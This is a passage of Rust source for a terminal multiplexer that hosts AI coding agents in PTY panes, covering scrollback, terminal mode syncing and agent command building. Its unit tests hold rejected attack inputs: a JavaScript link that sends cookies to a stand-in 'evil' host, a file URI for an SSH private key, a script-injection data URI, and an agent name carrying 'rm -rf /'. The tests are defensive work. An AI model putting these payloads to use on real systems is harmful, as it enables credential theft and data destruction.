        // if the PTY master never returns EOF.
        //
        // Why this is separate from the reader task: when the
        // foreground process exec'd into another binary and that
        // binary forks subprocesses (Claude Code spawning git, npm,
        // background watchers), those subprocesses inherit the slave
        // PTY fd. The slave only fully closes once *all* fd holders
        // exit, so the master read blocks indefinitely after the
        // foreground agent quits while the lingering subprocess
        // keeps the fd alive. The reader-EOF-only design left the
        // pane stuck in this case.
        //
        // `child.wait()` blocks until the foreground process is
        // reaped — the exact moment the operator's perspective says
        // "the agent exited." Sending Exited here lets the daemon
        // remove the pane immediately; the reader task (still
        // blocked on master) becomes a leak that ends when the
        // multiplexer process itself exits.
        tokio::task::spawn_blocking(move || {
            let status = child.wait();
            if let Some(pid) = child_pid {
                crate::pid1::unregister_managed_child(pid);
                crate::pid1::reap_zombies();
            }
            crate::clog!("session {sid}: child reaped: {status:?}");
            if event_tx_exit
                .send(SessionEvent::Exited { session_id: sid })
                .is_err()
            {
                crate::clog!(
                    "session {sid}: event channel closed — daemon will not see this child exit"
                );
            }
        });

        Ok((
            Session {
                label: label.into(),
                agent,
                provider,
                state: AgentState::Working,
                parser: vt100::Parser::new_with_callbacks(
                    rows,
                    cols,
                    SCROLLBACK_LEN,
                    OscCapture::with_policy(OscPolicy::from_env()),
                ),
                input_tx,
                pty_master: master,
                child_killer,
                last_output_at: std::time::Instant::now(),
                scrollback_offset: 0,
                inline_scrollback: VecDeque::new(),
                inline_scroll_region_tracker: InlineScrollRegionTracker::new(rows),
                bracketed_paste_active: false,
                received_output: false,
            },
            sid,
        ))
    }

    /// Scroll the view by `delta` lines. Positive = scroll up (into
    /// history); negative = scroll down (toward live tail).
    ///
    /// Up-scroll is clamped to the **actual filled scrollback** at
    /// call time. Without this clamp, scrolling past the top inflates
    /// `scrollback_offset` while vt100 clamps itself to the filled
    /// count, so subsequent down-scrolls must chew through the
    /// phantom distance before the visible view moves.
    pub fn scroll_by(&mut self, delta: i32) {
        let filled = self.scrollback_filled();
        let mut tail = jackin_tui::scroll::TailScroll::new(self.scrollback_offset);
        tail.scroll_by(filled, delta as isize);
        self.scrollback_offset = tail.offset();
        self.apply_scrollback_offset();
    }

    /// Drop scrollback view, return to the live tail.
    pub fn scroll_to_live(&mut self) {
        if self.scrollback_offset != 0 {
            self.scrollback_offset = 0;
            self.parser.screen_mut().set_scrollback(0);
        }
    }

    /// Clear this pane's saved scrollback and ask the foreground
    /// program to redraw its visible screen via the standard form-feed
    /// key (`Ctrl+L`). The visible grid is left to the PTY program so
    /// readline/TUI cursor state does not desynchronise from jackin's
    /// local `vt100` mirror.
    pub fn clear_scrollback_and_request_screen_clear(&mut self) {
        self.scroll_to_live();
        self.parser.screen_mut().clear_scrollback();
        self.inline_scrollback.clear();
        self.scrollback_offset = 0;
        self.send_input(b"\x0c");
    }

    /// Number of scrollback lines currently retained for this pane:
    /// native `vt100` scrollback plus the inline rows jackin' captures
    /// from top-anchored scroll regions. The `vt100` portion is probed
    /// by setting the scrollback to `usize::MAX`; vt100 clamps it to
    /// the actual filled count, which we read back via
    /// `Screen::scrollback`. The saved offset is restored so this is
    /// safe to call from a render path.
    pub fn scrollback_filled(&mut self) -> usize {
        let (vt_filled, inline_filled) = self.scrollback_counts();
        vt_filled.saturating_add(inline_filled)
    }

    pub fn scrollback_counts(&mut self) -> (usize, usize) {
        (self.vt_scrollback_filled(), self.inline_scrollback.len())
    }

    fn vt_scrollback_filled(&mut self) -> usize {
        let saved = self.parser.screen().scrollback();
        self.parser.screen_mut().set_scrollback(usize::MAX);
        let filled = self.parser.screen().scrollback();
        // saved.min(filled): vt100 rejects offsets above the actual fill
        // count, so restoring `saved` verbatim would be wrong if the fill
        // shrank between the read and the probe.
        self.parser.screen_mut().set_scrollback(saved.min(filled));
        filled
    }

    fn apply_scrollback_offset(&mut self) {
        let vt_filled = self.vt_scrollback_filled();
        self.parser
            .screen_mut()
            .set_scrollback(self.scrollback_offset.min(vt_filled));
    }

    fn clamp_scrollback_offset(&mut self) {
        let filled = self.scrollback_filled();
        let mut tail = jackin_tui::scroll::TailScroll::new(self.scrollback_offset);
        tail.clamp(filled);
        self.scrollback_offset = tail.offset();
    }

    /// Inline scrollback rows that should be prepended above the
    /// `vt100` visible rows for the current unified scrollback
    /// offset. Rendering this prefix in the shared pane renderer
    /// lets normal-screen panes with inline history use the same
    /// scrollbar chrome as vt100-scrollback panes.
    pub fn scrollback_render_prefix(&mut self, viewport_rows: u16) -> Vec<String> {
        let vt_filled = self.vt_scrollback_filled();
        self.parser
            .screen_mut()
            .set_scrollback(self.scrollback_offset.min(vt_filled));

        let inline_offset = self.scrollback_offset.saturating_sub(vt_filled);
        if inline_offset == 0 || viewport_rows == 0 {
            return Vec::new();
        }

        let start = self.inline_scrollback.len().saturating_sub(inline_offset);
        self.inline_scrollback
            .iter()
            .skip(start)
            .take(usize::from(viewport_rows))
            .cloned()
            .collect()
    }

    pub fn send_input(&self, data: &[u8]) {
        // Debug-only: log every byte chunk forwarded to a PTY. Pairs
        // with the `rx ClientFrame::Input` line on the receive side so
        // a `--debug` trace shows the full path from operator keystroke
        // to slave fd write.
        crate::cdebug!(
            "session send_input: agent={:?} label={} bytes={:02x?}",
            self.agent,
            self.label,
            data
        );
        // SendError fires when the writer task has exited (it owns the
        // receiver). The writer task emits SessionEvent::Exited before
        // dropping, so the daemon will reap this Session on the next
        // event tick — keystrokes accepted between writer death and
        // reap are lost, but observability remains: clog records both
        // halves of the failure chain.
        if let Err(e) = self.input_tx.send(data.to_vec()) {
            crate::clog!(
                "session send_input: writer task gone ({} bytes dropped): {e}",
                data.len()
            );
        }
    }

    /// Mark that the operator sent an explicit keyboard payload to this pane.
    /// Returns true when this clears a previously latched blocked state.
    pub fn mark_operator_input(&mut self) -> bool {
        let was_blocked = self.state == AgentState::Blocked;
        self.last_output_at = std::time::Instant::now();
        self.state = AgentState::Working;
        was_blocked
    }

    /// True when the session's program has enabled any mouse protocol
    /// mode. Used by the daemon to decide whether selection gestures
    /// belong to jackin or to the pane. Actual PTY mouse forwarding
    /// also consults `mouse_protocol_mode()` so press-only programs
    /// do not receive motion events.
    pub fn mouse_enabled(&self) -> bool {
        !matches!(
            self.parser.screen().mouse_protocol_mode(),
            vt100::MouseProtocolMode::None
        )
    }

    pub fn mouse_protocol_encoding(&self) -> vt100::MouseProtocolEncoding {
        self.parser.screen().mouse_protocol_encoding()
    }

    pub fn mouse_protocol_mode(&self) -> vt100::MouseProtocolMode {
        self.parser.screen().mouse_protocol_mode()
    }

    /// True when the session enabled DEC private mode `?1004` (focus
    /// event reporting). Daemon-facing accessor so the multiplexer
    /// does not have to reach through `parser.callbacks()` at every
    /// focus-swap / FocusIn / FocusOut decision site.
    pub fn focus_events_enabled(&self) -> bool {
        self.parser.callbacks().focus_events()
    }

    pub fn screen(&self) -> &vt100::Screen {
        self.parser.screen()
    }

    /// Feed PTY bytes into the VT parser and update activity timestamps.
    pub fn feed_pty(&mut self, bytes: &[u8]) {
        if !bytes.is_empty() {
            self.received_output = true;
        }
        crate::cdebug!(
            "session feed_pty bytes: agent={:?} label={} len={} bytes={:02x?}",
            self.agent,
            self.label,
            bytes.len(),
            bytes
        );
        let was_alternate = self.parser.screen().alternate_screen();
        let was_scrolled = self.scrollback_offset != 0;
        for &byte in bytes {
            let (screen_rows, _) = self.parser.screen().size();
            let actions = self.inline_scroll_region_tracker.advance(byte, screen_rows);
            self.capture_inline_scrollback_before_actions(actions);
            self.capture_inline_scrollback_before_byte(byte);
            self.parser.process(std::slice::from_ref(&byte));
        }
        let is_alternate = self.parser.screen().alternate_screen();
        if was_alternate != is_alternate {
            let (screen_rows, _) = self.parser.screen().size();
            self.inline_scroll_region_tracker.reset(screen_rows);
        }
        if was_alternate && !is_alternate {
            self.clear_transient_keyboard_modes();
        }
        if was_scrolled {
            self.clamp_scrollback_offset();
            self.apply_scrollback_offset();
        } else {
            self.scroll_to_live();
        }
        if crate::logging::debug_enabled() {
            let (vt_filled, inline_filled) = self.scrollback_counts();
            let screen = self.parser.screen();
            let (screen_rows, screen_cols) = screen.size();
            let (cursor_row, cursor_col) = screen.cursor_position();
            crate::cdebug!(
                "session feed_pty: agent={:?} label={} bytes={} alt_screen={} mouse_enabled={} screen={}x{} cursor={}x{} vt_scrollback={} inline_scrollback={} scrollback_offset={} inline_region={}..{}",
                self.agent,
                self.label,
                bytes.len(),
                screen.alternate_screen(),
                self.mouse_enabled(),
                screen_rows,
                screen_cols,
                cursor_row,
                cursor_col,
                vt_filled,
                inline_filled,
                self.scrollback_offset,
                self.inline_scroll_region_tracker.region.top,
                self.inline_scroll_region_tracker.region.bottom
            );
        }
        self.last_output_at = std::time::Instant::now();
        self.state = state_after_pty_output(self.state);
    }

    fn capture_inline_scrollback_before_actions(&mut self, actions: InlineScrollActions) {
        if let Some(mode) = actions.erase_display {
            self.capture_inline_scrollback_before_erase_display(mode);
        }
        if actions.scroll_up > 0 {
            self.capture_inline_scrollback_before_scroll_up(actions.scroll_up);
        }
    }

    fn capture_inline_scrollback_before_erase_display(&mut self, mode: u16) {
        if self.parser.screen().alternate_screen() {
            return;
        }

        match mode {
            // ED0 (`CSI J`) only removes the whole visible screen when
            // paired with a home cursor move, which is the normal-screen
            // clear/redraw shape used by shells and agent TUIs.
            0 => {
                let (cursor_row, cursor_col) = self.parser.screen().cursor_position();
                if cursor_row == 0 && cursor_col == 0 {
                    self.capture_visible_inline_scrollback_rows("erase-display");
                }
            }
            // ED2 (`CSI 2J`) clears the visible display. Preserve those
            // rows as terminal scrollback; ED3 below is the explicit
            // saved-lines clear and must not preserve them.
            2 => self.capture_visible_inline_scrollback_rows("erase-display"),
            3 => {
                self.inline_scrollback.clear();
                self.scrollback_offset = 0;
                crate::cdebug!(
                    "inline scrollback clear: agent={:?} label={} reason=erase-saved-lines",
                    self.agent,
                    self.label
                );
            }
            _ => {}
        }
    }

    fn capture_inline_scrollback_before_scroll_up(&mut self, count: usize) {
        if self.parser.screen().alternate_screen() {
            return;
        }

        let (screen_rows, screen_cols) = self.parser.screen().size();
        let Some(scroll_bottom) = self
            .inline_scroll_region_tracker
            .top_anchored_bottom(screen_rows)
        else {
            return;
        };

        let removed_rows = usize::from(scroll_bottom).saturating_add(1).min(count);
        let rows: Vec<_> = self
            .parser
            .screen()
            .rows(0, screen_cols)
            .take(removed_rows)
            .collect();
        for row in rows {
            self.push_inline_scrollback_row(row, "scroll-up");
        }
    }

    fn capture_visible_inline_scrollback_rows(&mut self, reason: &'static str) {
        let (_, screen_cols) = self.parser.screen().size();
        let rows: Vec<_> = self.parser.screen().rows(0, screen_cols).collect();
        let Some(first) = rows.iter().position(|row| !row.trim_end().is_empty()) else {
            return;
        };
        let Some(last) = rows.iter().rposition(|row| !row.trim_end().is_empty()) else {
            return;
        };

        for row in rows[first..=last].iter().cloned() {
            self.push_inline_scrollback_row(row, reason);
        }
    }

    fn capture_inline_scrollback_before_byte(&mut self, byte: u8) {
        if byte != b'\n' || self.parser.screen().alternate_screen() {
            return;
        }

        let (screen_rows, screen_cols) = self.parser.screen().size();
        let Some(scroll_bottom) = self
            .inline_scroll_region_tracker
            .top_anchored_bottom(screen_rows)
        else {
            return;
        };
        let (cursor_row, _) = self.parser.screen().cursor_position();
        if cursor_row != scroll_bottom {
            return;
        }

        let row = self
            .parser
            .screen()
            .rows(0, screen_cols)
            .next()
            .unwrap_or_default();
        if self.inline_scrollback.is_empty() && row.trim_end().is_empty() {
            return;
        }

        self.push_inline_scrollback_row(row, "linefeed");
    }

    fn push_inline_scrollback_row(&mut self, row: String, reason: &'static str) {
        if self.inline_scrollback.is_empty() && row.trim_end().is_empty() {
            return;
        }

        let row_len = row.len();
        self.inline_scrollback.push_back(row);
        if self.scrollback_offset != 0 {
            self.scrollback_offset = self.scrollback_offset.saturating_add(1);
        }
        while self.inline_scrollback.len() > SCROLLBACK_LEN {
            self.inline_scrollback.pop_front();
            self.scrollback_offset = self.scrollback_offset.saturating_sub(1);
        }
        crate::cdebug!(
            "inline scrollback capture: agent={:?} label={} reason={} row_len={} inline_filled={} scrollback_offset={} region={}..{}",
            self.agent,
            self.label,
            reason,
            row_len,
            self.inline_scrollback.len(),
            self.scrollback_offset,
            self.inline_scroll_region_tracker.region.top,
            self.inline_scroll_region_tracker.region.bottom
        );
    }

    fn clear_transient_keyboard_modes(&mut self) {
        let callbacks = self.parser.callbacks_mut();
        if !callbacks.kitty_kb_stack.is_empty() {
            callbacks.kitty_kb_stack.clear();
            callbacks.pending.push(b"\x1b[<u".to_vec());
        }
        if callbacks.modify_other_keys.take().is_some() {
            callbacks.pending.push(b"\x1b[>4;0m".to_vec());
        }
    }

    /// Drain the OSC / unhandled-CSI byte sequences the parser captured
    /// during the last `feed_pty` call. The daemon forwards these to
    /// the attached client only when this session owns the focused
    /// pane in the active tab — see `OscCapture` for the routing
    /// rationale.
    pub fn drain_passthrough(&mut self) -> Vec<Vec<u8>> {
        self.parser.callbacks_mut().drain()
    }

    /// Compare current vt100 mode state against the last observed
    /// snapshot and produce the matching `?<mode>h/l` byte sequences
    /// for any transitions. Used by the daemon to keep the outer
    /// terminal's mode state in sync with the focused agent's
    /// requests — currently bracketed paste, which vt100 absorbs
    /// silently otherwise and which breaks multi-line paste UX when
    /// the outer terminal stops wrapping clipboard content.
    pub fn drain_mode_transitions(&mut self) -> Vec<Vec<u8>> {
        let mut out = Vec::new();
        let cur_bracketed = self.parser.screen().bracketed_paste();
        if cur_bracketed != self.bracketed_paste_active {
            out.push(if cur_bracketed {
                b"\x1b[?2004h".to_vec()
            } else {
                b"\x1b[?2004l".to_vec()
            });
            self.bracketed_paste_active = cur_bracketed;
        }
        out
    }

    /// Snapshot of every pane-owned mode the daemon should restore
    /// on the outer terminal when this pane becomes focused or an
    /// attach client connects. Covers bracketed paste (`?2004`),
    /// application cursor keys (`?1`), DECTCEM cursor visibility
    /// (`?25`), and the top of the kitty keyboard stack
    /// (`\x1b[>{flags}u`).
    ///
    /// Mouse and focus reporting are intentionally absent: the
    /// attach client owns those modes so the multiplexer can always
    /// receive tab clicks, pane drags, selection gestures, and
    /// terminal FocusIn/FocusOut events. The daemon gates and
    /// re-encodes mouse/focus events before forwarding them to the
    /// focused pane.
    pub fn current_mode_state(&self) -> Vec<Vec<u8>> {
        let mut out = Vec::new();
        let screen = self.parser.screen();
        if screen.bracketed_paste() {
            out.push(b"\x1b[?2004h".to_vec());
        }
        if screen.application_cursor() {
            out.push(b"\x1b[?1h".to_vec());
        }
        // Kitty keyboard — restore the most recently pushed level
        // for this pane. Empty stack = "no kitty kb on outer terminal".
        if let Some(&flags) = self.parser.callbacks().kitty_kb_stack().last() {
            out.push(format!("\x1b[>{flags}u").into_bytes());
        }
        // Cursor visibility — always emit the new pane's desired
        // state so the outer terminal does not carry over the
        // previous pane's hidden cursor. Sending the opposite of
        // what the agent wants here would either leave a stale
        // block from the previous pane visible, or hide the
        // cursor an interactive shell needs.
        out.push(if screen.hide_cursor() {
            b"\x1b[?25l".to_vec()
        } else {
            b"\x1b[?25h".to_vec()
        });
        out
    }

    /// Outer-terminal modes owned by the attach client, not by the
    /// focused pane. Reassert after attach and focus swaps so a pane
    /// that requested legacy X10 or press-only mouse tracking cannot
    /// downgrade the multiplexer's own input channel. Alternate-scroll
    /// (`?1007`) is disabled because some terminals translate wheel
    /// gestures in the alternate screen into cursor keys; jackin'
    /// needs the wheel to stay as mouse input so the daemon can decide
    /// whether scrollback, PTY mouse forwarding, or a no-op owns it.
    pub fn client_owned_mode_state() -> &'static [u8] {
        b"\x1b[?9l\x1b[?1000l\x1b[?1002l\x1b[?1005l\x1b[?1015l\x1b[?1007l\x1b[?1003h\x1b[?1006h\x1b[?1004h"
    }

    /// Outer-terminal reset sequence applied just before a focus
    /// swap restores the new pane's mode state. Disables every mode
    /// the previous pane's agent might have left on so the new pane
    /// starts from a clean baseline. Cheap to send unconditionally
    /// because each `?...l` against a not-set mode is a no-op.
    pub fn focus_swap_reset() -> &'static [u8] {
        // Reset only modes the *agent* may have switched on. The
        // client owns mouse reporting (`?1000`/`?1002`/`?1003`/`?1006`),
        // focus reporting (`?1004`), and alt-screen (`?1049`) for
        // its own UI (tab clicks, drag-resize, focus swap detection);
        // disabling those here drops the multiplexer's ability to
        // receive mouse / focus events for the rest of the session.
        // Cursor visibility is also out — `current_mode_state`
        // unconditionally re-asserts `?25h` or `?25l` next, so a
        // reset toggle would only flash the cursor.
        b"\x1b[<u\x1b[?2004l\x1b[?1l"
    }

    pub fn terminate(&self) {
        match self.child_killer.lock() {
            Ok(mut killer) => {
                if let Err(e) = killer.kill() {
                    crate::clog!("session terminate: child kill failed: {e}");
                }
            }
            Err(e) => crate::clog!("session terminate: child killer mutex poisoned: {e}"),
        }
    }

    pub fn title(&self) -> Option<&str> {
        self.parser.callbacks().title()
    }

    /// Most recently announced working directory (OSC 7), if any.
    pub fn cwd(&self) -> Option<&str> {
        self.parser.callbacks().cwd()
    }

    pub fn resize(&mut self, rows: u16, cols: u16) {
        // TIOCSWINSZ failure leaves the agent drawing at the old size
        // while the screen renders at the new geometry — the operator
        // sees mis-wrapped lines with no explanation. Log so --debug
        // surfaces the divergence. Lock failure is logged too: a
        // poisoned PTY mutex means an earlier writer/reader task
        // panicked while holding it, and the session is effectively
        // dead even if no Exited event has fired yet.
        match self.pty_master.lock() {
            Ok(master) => {
                if let Err(e) = master.resize(PtySize {
                    rows,
                    cols,
                    pixel_width: 0,
                    pixel_height: 0,
                }) {
                    crate::clog!("session resize: TIOCSWINSZ failed for {rows}x{cols}: {e}");
                }
            }
            Err(e) => crate::clog!("session resize: PTY mutex poisoned: {e}"),
        }
        self.parser.screen_mut().set_size(rows, cols);
        self.inline_scroll_region_tracker.resize(rows);
        self.clamp_scrollback_offset();
        self.apply_scrollback_offset();
    }

    pub fn refresh_state(&mut self) {
        // `AgentState::Done` is part of the protocol surface but never
        // produced: `remove_exited_session` removes the Session entry
        // the moment the PTY's child reaper fires (see daemon.rs
        // SessionEvent::Exited handler), so there is no live `Session`
        // instance to refresh past that point. Operators experience
        // tab removal directly; no transient `○ Done` glyph.
        let elapsed = self.last_output_at.elapsed();
        self.state = state_after_refresh(self.state, elapsed);
    }
}

#[cfg(test)]
impl Session {
    #[allow(clippy::too_many_arguments)]
    pub(crate) fn new_for_test(
        label: String,
        agent: Option<String>,
        provider: Option<SessionProvider>,
        size: (u16, u16),
        scrollback_len: usize,
        input_tx: mpsc::UnboundedSender<Vec<u8>>,
        pty_master: Arc<Mutex<Box<dyn MasterPty + Send>>>,
        child_killer: Arc<Mutex<Box<dyn ChildKiller + Send + Sync>>>,
    ) -> Self {
        Self {
            label,
            agent,
            provider,
            state: AgentState::Working,
            parser: vt100::Parser::new_with_callbacks(
                size.0,
                size.1,
                scrollback_len,
                OscCapture::with_policy(OscPolicy::default()),
            ),
            input_tx,
            pty_master,
            child_killer,
            last_output_at: std::time::Instant::now(),
            scrollback_offset: 0,
            inline_scrollback: VecDeque::new(),
            inline_scroll_region_tracker: InlineScrollRegionTracker::new(size.0),
            bracketed_paste_active: false,
            received_output: true,
        }
    }
}

fn state_after_pty_output(current: AgentState) -> AgentState {
    match current {
        AgentState::Blocked | AgentState::Done => current,
        AgentState::Working | AgentState::Idle => AgentState::Working,
    }
}

fn state_after_refresh(current: AgentState, elapsed: std::time::Duration) -> AgentState {
    match current {
        AgentState::Blocked | AgentState::Done => current,
        AgentState::Working | AgentState::Idle if elapsed < BLOCKED_AFTER => AgentState::Working,
        AgentState::Working | AgentState::Idle => AgentState::Blocked,
    }
}

/// Reject agent-slug strings that are flags (start with `-`), empty,
/// contain whitespace / control characters, or — when the launch
/// config lists supported agents — do not appear in that allowlist.
/// Shared by the PID-1 argv path, the
/// `jackin-capsule new <agent>` client path, and the daemon's
/// `Hello.spawn` decode path so all three trust boundaries
/// apply the same gate.
pub fn validate_agent_slug<'a>(
    raw: &'a str,
    supported_agents: &[String],
) -> Result<&'a str, &'static str> {
    if raw.is_empty() {
        return Err("empty value");
    }
    if raw.starts_with('-') {
        return Err("looks like a flag");
    }
    if raw.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err("contains whitespace or control characters");
    }
    if !supported_agents.is_empty() && !supported_agents.iter().any(|a| a == raw) {
        return Err("not in launch config allowlist");
    }
    Ok(raw)
}

/// Build a CommandBuilder for an agent session.
///
/// Entrypoint is `/jackin/runtime/entrypoint.sh` with `JACKIN_AGENT=<slug>`.
/// `cwd` is the workspace workdir from the Capsule launch config. It must be
/// passed explicitly: portable_pty's `CommandBuilder`
/// defaults the child's cwd to `$HOME` when none is set — it does not
/// inherit the daemon's cwd — so omitting this would land every agent in
/// `/home/agent` regardless of the workspace.
pub fn build_agent_command(
    agent: &str,
    model: Option<&str>,
    env_passthrough: &[(String, String)],
    cwd: &Path,
    codename: &str,
) -> CommandBuilder {
    let mut cmd = CommandBuilder::new("/jackin/runtime/entrypoint.sh");
    for arg in agent_model_args(agent, model) {
        cmd.arg(arg);
    }
    for (k, v) in env_passthrough {
        cmd.env(k, v);
    }
    cmd.env("JACKIN_AGENT", agent);
    cmd.env("JACKIN_AGENT_CODENAME", codename);
    apply_terminal_env(&mut cmd);
    cmd.cwd(cwd);
    cmd
}

fn agent_model_args<'a>(agent: &str, model: Option<&'a str>) -> Vec<&'a str> {
    let Some(model) = model else {
        return Vec::new();
    };
    match agent {
        "claude" | "kimi" => vec!["--model", model],
        "codex" | "opencode" => vec!["-m", model],
        _ => Vec::new(),
    }
}

/// Build a CommandBuilder for an interactive shell session.
///
/// See `build_agent_command` for the `cwd` rationale.
pub fn build_shell_command(env_passthrough: &[(String, String)], cwd: &Path, codename: &str) -> CommandBuilder {
    let mut cmd = CommandBuilder::new("/bin/zsh");
    for (k, v) in env_passthrough {
        cmd.env(k, v);
    }
    cmd.env_remove("JACKIN_AGENT");
    cmd.env("JACKIN_AGENT_CODENAME", codename);
    apply_terminal_env(&mut cmd);
    cmd.cwd(cwd);
    cmd
}

/// Apply the stable pane terminal environment. The active outer terminal is
/// reported per attach through the Capsule protocol; pane PTYs keep a
/// conservative baseline so a running session can be reattached from Ghostty,
/// Kitty, iTerm, Warp, or any other xterm-compatible client without retaining
/// assumptions from the terminal that launched the container. `COLORTERM`
/// intentionally advertises jackin's 24-bit color path without tying the pane
/// to a host-specific terminfo entry.
fn apply_terminal_env(cmd: &mut CommandBuilder) {
    cmd.env("TERM", "xterm-256color");
    cmd.env("COLORTERM", "truecolor");
    for key in ["LANG", "LC_ALL"] {
        if let Ok(value) = std::env::var(key) {
            cmd.env(key, value);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn focus_swap_reset_covers_every_mode_current_mode_state_may_emit() {
        // Symmetry contract: every mode that `current_mode_state` can
        // set on the outer terminal during focus-in must have a
        // matching off-toggle in `focus_swap_reset`, otherwise the
        // previous pane's mode silently leaks into the new pane.
        //
        // `current_mode_state` can emit:
        //   - `\x1b[?2004h` (bracketed paste)   → reset `?2004l`
        //   - `\x1b[?1h`    (application cursor) → reset `?1l`
        //   - `\x1b[>{n}u`  (kitty kb push)     → reset `\x1b[<u` (pop)
        //   - `\x1b[?25h/l` (cursor visibility) → intentionally NOT in
        //                                         reset; `current_mode_state`
        //                                         unconditionally re-asserts.
        let reset = Session::focus_swap_reset();
        for needle in [&b"\x1b[?2004l"[..], &b"\x1b[?1l"[..], &b"\x1b[<u"[..]] {
            assert!(
                reset.windows(needle.len()).any(|w| w == needle),
                "focus_swap_reset missing {needle:?}; got {reset:?}"
            );
        }
    }

    #[test]
    fn client_owned_mode_state_captures_mouse_focus_and_alternate_scroll() {
        let state = Session::client_owned_mode_state();
        for needle in [
            &b"\x1b[?1003h"[..],
            &b"\x1b[?1006h"[..],
            &b"\x1b[?1004h"[..],
            &b"\x1b[?1007l"[..],
        ] {
            assert!(
                state.windows(needle.len()).any(|w| w == needle),
                "client_owned_mode_state missing {needle:?}; got {state:?}"
            );
        }
    }

    #[test]
    fn focus_swap_reset_leaves_client_owned_modes_alone() {
        // The attach client owns mouse reporting, focus reporting,
        // alt-screen, and alternate-scroll suppression. The reset must
        // not touch them; clobbering them here drops the multiplexer's
        // ability to receive tab clicks, drag-resize, FocusIn/FocusOut,
        // or wheel mouse events for the remainder of the session.
        let reset = Session::focus_swap_reset();
        for forbidden in [
            &b"\x1b[?1000l"[..],
            &b"\x1b[?1002l"[..],
            &b"\x1b[?1003l"[..],
            &b"\x1b[?1006l"[..],
            &b"\x1b[?1007l"[..],
            &b"\x1b[?1004l"[..],
            &b"\x1b[?1049l"[..],
            &b"\x1b[?25l"[..],
            &b"\x1b[?25h"[..],
        ] {
            assert!(
                !reset.windows(forbidden.len()).any(|w| w == forbidden),
                "focus_swap_reset must not toggle {forbidden:?}"
            );
        }
    }

    #[test]
    fn build_agent_command_overrides_stale_agent_env() {
        let env = vec![("JACKIN_AGENT".to_string(), "claude".to_string())];
        let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

        assert_eq!(
            cmd.get_env("JACKIN_AGENT").and_then(|value| value.to_str()),
            Some("codex")
        );
    }

    #[test]
    fn build_agent_command_uses_stable_pane_term() {
        let env = vec![("TERM".to_string(), "xterm-ghostty".to_string())];
        let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

        assert_eq!(
            cmd.get_env("TERM").and_then(|value| value.to_str()),
            Some("xterm-256color")
        );
    }

    #[test]
    fn build_agent_command_advertises_truecolor() {
        let env = vec![("COLORTERM".to_string(), "24bit".to_string())];
        let cmd = build_agent_command("claude", None, &env, Path::new("/workspace"), "test");

        assert_eq!(
            cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
            Some("truecolor")
        );
    }

    #[test]
    fn build_shell_command_advertises_truecolor() {
        let env = vec![("COLORTERM".to_string(), "false".to_string())];
        let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

        assert_eq!(
            cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
            Some("truecolor")
        );
    }

    #[test]
    fn agent_model_args_match_cli_contracts() {
        assert_eq!(
            agent_model_args("claude", Some("sonnet")),
            vec!["--model", "sonnet"]
        );
        assert_eq!(
            agent_model_args("codex", Some("gpt-5")),
            vec!["-m", "gpt-5"]
        );
        assert_eq!(
            agent_model_args("kimi", Some("kimi-k2")),
            vec!["--model", "kimi-k2"]
        );
        assert_eq!(
            agent_model_args("opencode", Some("zai/glm")),
            vec!["-m", "zai/glm"]
        );
        assert!(agent_model_args("amp", None).is_empty());
        assert!(agent_model_args("amp", Some("ignored")).is_empty());
    }

    #[test]
    fn build_shell_command_removes_stale_agent_env() {
        let env = vec![("JACKIN_AGENT".to_string(), "claude".to_string())];
        let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

        assert!(cmd.get_env("JACKIN_AGENT").is_none());
    }

    #[test]
    fn pty_output_does_not_clear_latched_blocked_state() {
        assert_eq!(
            state_after_pty_output(AgentState::Blocked),
            AgentState::Blocked
        );
        assert_eq!(
            state_after_pty_output(AgentState::Working),
            AgentState::Working
        );
        assert_eq!(
            state_after_pty_output(AgentState::Idle),
            AgentState::Working
        );
    }

    #[test]
    fn refresh_latches_blocked_until_operator_input() {
        assert_eq!(
            state_after_refresh(AgentState::Working, BLOCKED_AFTER),
            AgentState::Blocked
        );
        assert_eq!(
            state_after_refresh(AgentState::Blocked, std::time::Duration::ZERO),
            AgentState::Blocked
        );
        assert_eq!(
            state_after_refresh(AgentState::Idle, BLOCKED_AFTER / 2),
            AgentState::Working
        );
    }

    #[test]
    fn osc8_uri_empty_is_safe() {
        // Empty URI = link terminator; must always pass.
        assert!(osc8_uri_is_safe(b""));
    }

    #[test]
    fn osc8_uri_http_https_mailto_pass() {
        assert!(osc8_uri_is_safe(b"http://example.com"));
        assert!(osc8_uri_is_safe(b"https://example.com"));
        assert!(osc8_uri_is_safe(b"HTTPS://EXAMPLE.COM"));
        assert!(osc8_uri_is_safe(b"mailto:foo@example.com"));
    }

    #[test]
    fn osc8_uri_unsafe_schemes_rejected() {
        // The threat scenarios the allowlist is here to block.
        assert!(!osc8_uri_is_safe(
            b"javascript:fetch('//evil/?'+document.cookie)"
        ));
        assert!(!osc8_uri_is_safe(b"file:///Users/operator/.ssh/id_rsa"));
        assert!(!osc8_uri_is_safe(
            b"data:text/html,<script>alert(1)</script>"
        ));
        assert!(!osc8_uri_is_safe(b"ssh://server"));
    }

    #[test]
    fn osc8_uri_non_utf8_rejected() {
        // A URI that isn't valid UTF-8 cannot pass the lowercase
        // scheme check. Defensive — terminal emulators would reject
        // it too — but the allowlist must not accidentally permit
        // it via the from_utf8 short-circuit.
        assert!(!osc8_uri_is_safe(&[0xFF, 0xFE]));
    }

    #[test]
    fn validate_agent_slug_rejects_typical_attacks() {
        let supported = Vec::new();
        assert!(validate_agent_slug("", &supported).is_err());
        assert!(validate_agent_slug("--debug", &supported).is_err());
        assert!(validate_agent_slug("claude\n; rm -rf /", &supported).is_err());
        assert!(validate_agent_slug("claude codex", &supported).is_err());
        assert!(validate_agent_slug("claude\0", &supported).is_err());
    }

    #[test]
    fn validate_agent_slug_accepts_well_formed_slug_when_no_allowlist() {
        let supported = Vec::new();
        assert!(validate_agent_slug("claude", &supported).is_ok());
        assert!(validate_agent_slug("codex", &supported).is_ok());
    }

    #[test]
    fn validate_agent_slug_rejects_slug_outside_launch_config_allowlist() {
        let supported = vec!["claude".to_string()];
        assert!(validate_agent_slug("claude", &supported).is_ok());
        assert_eq!(
            validate_agent_slug("codex", &supported).unwrap_err(),
            "not in launch config allowlist"
        );
    }

    #[test]
    fn pull_request_checks_from_buckets_keeps_sum_equals_total_for_known_inputs() {
        let checks = PullRequestChecks::from_buckets([
